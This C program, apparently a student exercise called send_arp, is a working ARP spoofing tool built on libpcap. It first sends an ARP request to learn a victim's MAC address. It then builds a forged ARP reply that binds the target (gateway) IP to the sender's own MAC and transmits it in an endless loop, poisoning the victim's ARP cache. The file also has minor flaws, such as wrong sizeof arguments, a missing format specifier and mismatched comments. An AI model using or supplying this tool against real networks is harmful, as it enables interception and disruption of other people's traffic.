/* ref 1 - (getmac) http://egloos.zum.com/kangfeel38/v/4273426
 * ref 2 -
 */
#pragma once

#include "getMac.h"
#include "getIp.h"

struct ether_header eth_h;
struct ether_arp req;
uint8_t sender_mac[ETH_ALEN];

void arp_request(){

    /***************** Make Ethernet packet (L2) *****************/
    memset(eth_h.ether_dhost, 0xFF, sizeof(eth_h.ether_dhost)); /* target h/w addr: FF~broadcast */
    memcpy(eth_h.ether_shost, world_my_mac, sizeof(eth_h.ether_shost)); //set my mac
    eth_h.ether_type = htons(ETH_P_ARP); /* (0x0806) -> (0x0608) */

    /**************** Make ARP REQUEST packet (L3) *****************/
    req.arp_hrd = htons(ARPHRD_ETHER); /* 1 = Ethernet 10/100Mbps. */
    req.arp_pro = htons(ETH_P_IP); /* (0x0800) -> (0x0008) */
    req.arp_hln = ETHER_ADDR_LEN;
    req.arp_pln = sizeof(in_addr_t);
    req.arp_op = htons (ARPOP_REQUEST); /* REQUEST = 1 */
    memcpy(&req.arp_sha, world_my_mac, sizeof(req.arp_sha)); /* sender h/w address */
    memcpy(&req.arp_spa, world_split_my_ip, sizeof(req.arp_sha)); /* sender ip address */
    memset(&req.arp_tha, 0, sizeof(req.arp_tha)); /* target h/w addr: 00~ */
    memcpy(&req.arp_tpa, world_split_sender_ip, sizeof(req.arp_tpa)); /* sender ip address */
}

void arp_reply() {

    /***************** Make Ethernet packet (L2) *****************/
    memcpy(eth_h.ether_dhost, sender_mac, sizeof(eth_h.ether_dhost)); /* sender h/w addr: FF~broadcast */
    memcpy(eth_h.ether_shost, world_my_mac, sizeof(eth_h.ether_shost)); //set my mac
    eth_h.ether_type = htons(ETH_P_ARP); /* (0x0806) -> (0x0608) */

    /**************** Make ARP REQUEST packet (L3) *****************/
    req.arp_hrd = htons(ARPHRD_ETHER); /* 1 = Ethernet 10/100Mbps. */
    req.arp_pro = htons(ETH_P_IP); /* (0x0800) -> (0x0008) */
    req.arp_hln = ETHER_ADDR_LEN;
    req.arp_pln = sizeof(in_addr_t);
    req.arp_op = htons (ARPOP_REPLY); /* REPLY = 2 */
    memcpy(&req.arp_sha, world_my_mac, sizeof(req.arp_sha)); /* sender h/w address */
    memcpy(&req.arp_spa, world_split_target_ip, sizeof(req.arp_sha)); /* sender ip address */
    memcpy(&req.arp_tha, sender_mac, sizeof(req.arp_tha)); /* target h/w addr: 00~ */
    memcpy(&req.arp_tpa, world_split_sender_ip, sizeof(req.arp_tpa)); /* sender ip address */

}

int main (int argc, char **argv){
    if (argc != 4){
        printf("usage: ./send_arp <interface> <sender_ip> <target_ip>\n");
        return -1;
    }

    int i = 0;
    u_char packet[1500];
    world_argv = argv[1]; /* (User input) interface name */
    sender_ip_split(argv[2]); /* (User input) sender ip split */
    target_ip_split(argv[3]); /* (User input) target ip split */

    line_print();
    GetMacAddress();
    GetIpAddress();
    arp_request();

    int length = 0;
    memset(packet, 0, sizeof(packet)); /* clean packet buffer */
    memcpy(packet, &eth_h, sizeof(eth_h));
    length += sizeof(eth_h);

    memcpy(packet+length, &req, sizeof(req));
    length += sizeof(req);

    char pcap_errbuf [PCAP_ERRBUF_SIZE];
    pcap_errbuf [0] = '\0';
    pcap_t* pcap = pcap_open_live(argv[1], 96, 0, 0, pcap_errbuf);
    /*(device, captuer max byte, NIC PROMSIC, read timeout, error_buffer)*/
    if (pcap_errbuf[0] != '\0') fprintf (stderr, "%s", pcap_errbuf);
    if (!pcap) exit (1);

    struct pcap_pkthdr* header;
    const u_char* _packet;

    /******************* send packet and listen reply ********************/
    while(true){

    /* send packet */ /* send 1 */
    if (pcap_sendpacket(pcap, packet, length)){
        fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(pcap));
        return -1;
    }
         int res = pcap_next_ex(pcap, &header, &_packet);
         if (res == 0) continue;
         if (res == -1 || res == -2) break;

         if(_packet[28] == world_split_sender_ip[0] && _packet[29] == world_split_sender_ip[1] \
                 && _packet[30] == world_split_sender_ip[2] && _packet[31] == world_split_sender_ip[3] \
                 && _packet[21] == 0x02){

             line_print();
             printf("%d.%d.%d.%d ",\
                    (uint8_t)_packet[28], (uint8_t)_packet[29],(uint8_t)_packet[30],\
                     (uint8_t)_packet[31]);
              printf("is ARP reply(%02x)! \nget MAC Address : ", _packet[21]);
              memcpy(sender_mac, _packet+22, sizeof(sender_mac));
              printf("%02X:%02X:%02X:%02X:%02X:%02X \n",\
                     _packet[22], _packet[23], _packet[24], _packet[25], _packet[26], _packet[27]);
              break;
         }else continue;
    } line_print();

    /******************* (spoof) gateway ip, my mac setting ********************/
    arp_reply();
    length = 0;

    memset(packet, 0, sizeof(packet)); /* clean packet buffer */
    memcpy(packet, &eth_h, sizeof(eth_h));
    length += sizeof(eth_h);

    memcpy(packet+length, &req, sizeof(req));
    length += sizeof(req);

    while(true){

    /* send packet */ /* reply */
    if (pcap_sendpacket(pcap, packet, length)){
        fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(pcap));
        return -1;
     }
    }
   return 0;

}
